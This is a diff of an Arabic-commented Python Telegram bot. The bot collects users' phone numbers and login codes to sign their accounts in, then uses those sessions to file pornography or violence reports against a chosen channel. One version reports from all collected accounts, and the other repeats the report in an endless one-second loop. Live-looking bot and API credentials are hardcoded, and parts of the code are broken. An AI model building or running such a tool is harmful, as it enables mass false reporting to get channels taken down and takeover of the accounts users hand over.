@@ -1,126 +1,105 @@
-import logging
 from aiogram import Bot, Dispatcher, types
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
+from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.utils import executor
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
 from telethon.tl.functions.account import ReportPeerRequest
-from telethon.tl.types import InputReportReasonPornography, InputReportReasonSpam
+from telethon.tl.types import InputReportReasonPornography
+import asyncio
 
-# تفعيل تسجيل الأخطاء
-logging.basicConfig(level=logging.INFO)
-
-# توكن البوت من BotFather
+# توكن البوت
 BOT_TOKEN = '7492900908:AAGiiLlsafD-O4Fam6r5vP07vo2I8IeXVCc'
+api_id = 16748685
+api_hash = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'
+
+# إعدادات البوت
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 
-# معلومات الحسابات المسجلة
-registered_accounts = {}
+# إعداد عميل Telegram
+client = TelegramClient('hso', api_id, api_hash)
 
-# قائمة البلاغات
-report_reasons = {
-    "Pornography": InputReportReasonPornography(),
-    "Spam": InputReportReasonSpam()
-}
-
-# زر البلاغات
-def get_report_keyboard():
-    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
-    for reason in report_reasons:
-        keyboard.add(KeyboardButton(reason))
-    return keyboard
-
-# بدء المحادثة
+# زر البداية
 @dp.message_handler(commands=['start'])
-async def send_welcome(message: types.Message):
-    await message.reply("مرحبًا! أرسل رقم هاتفك مع رمز الدولة لتسجيل الحساب.")
+async def start_command(message: types.Message):
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("تسليم حساب", callback_data="deliver_account"),
+        InlineKeyboardButton("الإبلاغ عن قناة/مجموعة", callback_data="report_channel")
+    )
+    await message.answer("مرحبًا! اختر أحد الخيارات التالية:", reply_markup=keyboard)
 
-# تسجيل الرقم وإرسال كود التفعيل
-@dp.message_handler(lambda message: message.text.startswith('+'))
-async def register_number(message: types.Message):
-    phone_number = message.text
-    if phone_number in registered_accounts:
-        await message.reply("هذا الرقم مسجل بالفعل.")
-        return
+# زر تسليم الحساب
+@dp.callback_query_handler(lambda c: c.data == 'deliver_account')
+async def deliver_account(callback_query: types.CallbackQuery):
+    await callback_query.message.answer("يرجى إدخال رقم الهاتف مع رمز الدولة:")
+    await bot.register_next_step_handler(callback_query.message, receive_phone)
 
-    await message.reply("جاري إرسال كود التفعيل، انتظر...")
-    
-    # إعداد حساب Telegram باستخدام Telethon
-    api_id = '16748685'
-    api_hash = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'
-    client = TelegramClient(phone_number, api_id, api_hash)
-
+async def receive_phone(message: types.Message):
+    phone_number = message.text.strip()
     await client.connect()
     if not await client.is_user_authorized():
         try:
-            # إرسال كود التفعيل
             await client.send_code_request(phone_number)
-            registered_accounts[phone_number] = client
-            await message.reply("تم إرسال كود التفعيل. أدخل الكود الآن.")
+            await message.answer("تم إرسال كود التحقق، يرجى إدخاله:")
+            await bot.register_next_step_handler(message, receive_code, phone_number)
         except Exception as e:
-            await message.reply(f"حدث خطأ: {str(e)}")
-    else:
-        await message.reply("هذا الحساب مسجل بالفعل.")
-        await client.disconnect()
+            await message.answer(f"خطأ في إرسال الكود: {str(e)}")
 
-# إدخال كود التفعيل
-@dp.message_handler(lambda message: message.text.isdigit())
-async def enter_code(message: types.Message):
-    code = message.text
-    phone_number = None
-    for number, client in registered_accounts.items():
-        if not await client.is_user_authorized():
-            phone_number = number
-            break
-
-    if phone_number is None:
-        await message.reply("لا يوجد حساب يتطلب كود تفعيل.")
-        return
-
-    client = registered_accounts[phone_number]
+async def receive_code(message: types.Message, phone_number):
+    code = message.text.strip()
     try:
-        await client.sign_in(phone=phone_number, code=code)
-        await message.reply(f"تم تسجيل الحساب بنجاح. يمكنك الآن إرسال بلاغات.")
-    except SessionPasswordNeededError:
-        await message.reply("الحساب يتطلب كلمة مرور (2FA).")
+        await client.sign_in(phone_number, code)
+        await message.answer("تم تسجيل الدخول بنجاح!")
     except Exception as e:
-        await message.reply(f"حدث خطأ أثناء التفعيل: {str(e)}")
-    finally:
-        await client.disconnect()
+        await message.answer(f"خطأ أثناء تسجيل الدخول: {str(e)}")
 
-# بدء الإبلاغ
-@dp.message_handler(lambda message: message.text.lower() == 'بلاغ')
-async def start_report(message: types.Message):
-    await message.reply("أرسل رابط القناة أو المجموعة التي تريد الإبلاغ عنها.")
+# زر الإبلاغ
+@dp.callback_query_handler(lambda c: c.data == 'report_channel')
+async def report_channel(callback_query: types.CallbackQuery):
+    await callback_query.message.answer("يرجى إدخال اسم المستخدم أو الرابط للقناة/المجموعة:")
+    await bot.register_next_step_handler(callback_query.message, receive_username)
 
-# استقبال رابط المجموعة أو القناة
-@dp.message_handler(lambda message: message.text.startswith('https://t.me/'))
-async def report_channel(message: types.Message):
-    target_link = message.text
-    await message.reply("اختر سبب البلاغ:", reply_markup=get_report_keyboard())
-    dp.register_message_handler(lambda m: process_report(m, target_link))
+async def receive_username(message: types.Message):
+    channel_username = message.text.strip()
+    try:
+        await client.connect()
+        channel = await client.get_entity(channel_username)
 
-# تنفيذ البلاغ
-async def process_report(message: types.Message, target_link: str):
-    reason_text = message.text
-    reason = report_reasons.get(reason_text)
+        # عرض معلومات القناة
+        formatted_info = (
+            f"معلومات حول القناه/المجموعه:\n"
+            f"ID: {channel.id}\n"
+            f"Title: {channel.title}\n"
+            f"Username: {channel.username}\n"
+        )
+        await message.answer(formatted_info)
 
-    if not reason:
-        await message.reply("سبب البلاغ غير صحيح.")
-        return
+        # إرسال خيارات الإبلاغ
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(
+            InlineKeyboardButton("محتوى إباحي", callback_data="report_porn"),
+            InlineKeyboardButton("محتوى عنيف", callback_data="report_violence")
+        )
+        await message.answer("يرجى اختيار نوع البلاغ:", reply_markup=keyboard)
 
-    # إرسال البلاغ من كل حساب مسجل
-    for phone_number, client in registered_accounts.items():
+    except Exception as e:
+        await message.answer(f"خطأ: {str(e)}")
+
+# أنواع البلاغات
+@dp.callback_query_handler(lambda c: c.data in ['report_porn', 'report_violence'])
+async def handle_report(callback_query: types.CallbackQuery):
+    reason = InputReportReasonPornography() if callback_query.data == 'report_porn' else InputReportReasonViolence()
+    channel_username = callback_query.message.reply_to_message.text.strip()
+    
+    # بدء البلاغ المتكرر
+    while True:
         try:
-            await client.connect()
-            entity = await client.get_entity(target_link)
-            await client(ReportPeerRequest(peer=entity, reason=reason, message=f"الإبلاغ عن {target_link}"))
-            await message.reply(f"تم إرسال البلاغ من الحساب {phone_number}")
+            await client(ReportPeerRequest(peer=channel_username, reason=reason, message="بلاغ بسبب المحتوى"))
+            await callback_query.message.answer(f"تم الإبلاغ عن {channel_username} بنجاح.")
+            await asyncio.sleep(1)  # تأخير زمني بين البلاغات
         except Exception as e:
-            await message.reply(f"حدث خطأ في الحساب {phone_number}: {str(e)}")
-        finally:
-            await client.disconnect()
+            await callback_query.message.answer(f"خطأ أثناء الإبلاغ: {str(e)}")
+            break
 
 # تشغيل البوت
 if __name__ == '__main__':
